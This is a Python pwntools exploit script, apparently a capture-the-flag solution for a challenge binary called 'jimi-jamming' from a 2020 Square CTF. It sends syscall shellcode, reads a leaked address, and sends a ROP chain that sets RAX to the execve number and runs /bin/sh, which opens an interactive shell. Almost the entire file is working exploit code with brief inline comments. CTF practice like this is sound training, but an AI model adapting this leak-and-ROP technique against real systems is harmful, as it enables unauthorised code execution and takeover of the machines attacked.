#!/usr/bin/env python3

from pwn import *

exe = ELF("./jimi-jamming", checksec=0)
libc = ELF("./libc.so.6", checksec=0)
ld = ELF("./ld-2.31.so", checksec=0)

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})


def main():
    r = conn()
    #r = remote("challenges.2020.squarectf.com", 9001)
    
    #0x55df37b56dcf: Pop rax; ret

    shellcode = asm("""
    pop rdx;
    pop rsi;

    push rsp;
    pop rdi;

    syscall
    """)

    r.recvline()
    r.send(shellcode)   #key

    r.recvline()
    r.send("0")         #key place

    r.recvuntil("The tour center is right here! ")
    LEAK = int(r.recv(14).strip(), 16)
    log.warn("Leak @ 0x%x", LEAK)

    for _ in range(2):
        r.recvline()

    PopRax = LEAK + 0xdcf
    Shellcode = LEAK

    ROP = b""
    
    ROP += p64(LEAK)        # This goes to the first element in the array of 2 long ints.
    ROP += p64(LEAK)        # The second element of the same array.
    ROP += p64(0)           # The counter "i" should be 0 to bypass the check.
    ROP += p64(LEAK)        # RBP

    ROP += p64(PopRax)      # Set RAX to 0x3b to execute syscall after.
    ROP += p64(0x3b)

    ROP += p64(Shellcode)   # Jump to our shellcode in the Heap, the shellcode ends with syscall.
    ROP += p64(0)           # RDX = 0 when RSP reaches this point and pop rdx is executed from shellcode.
    ROP += p64(0)           # RSI = 0
    ROP += b"/bin/sh\x00"   # *RDI = "/bin/sh\x00"


    print("ROP len ", hex(len(ROP)))
    pause()
    r.send(ROP)
    
    r.interactive()


if __name__ == "__main__":
    main()
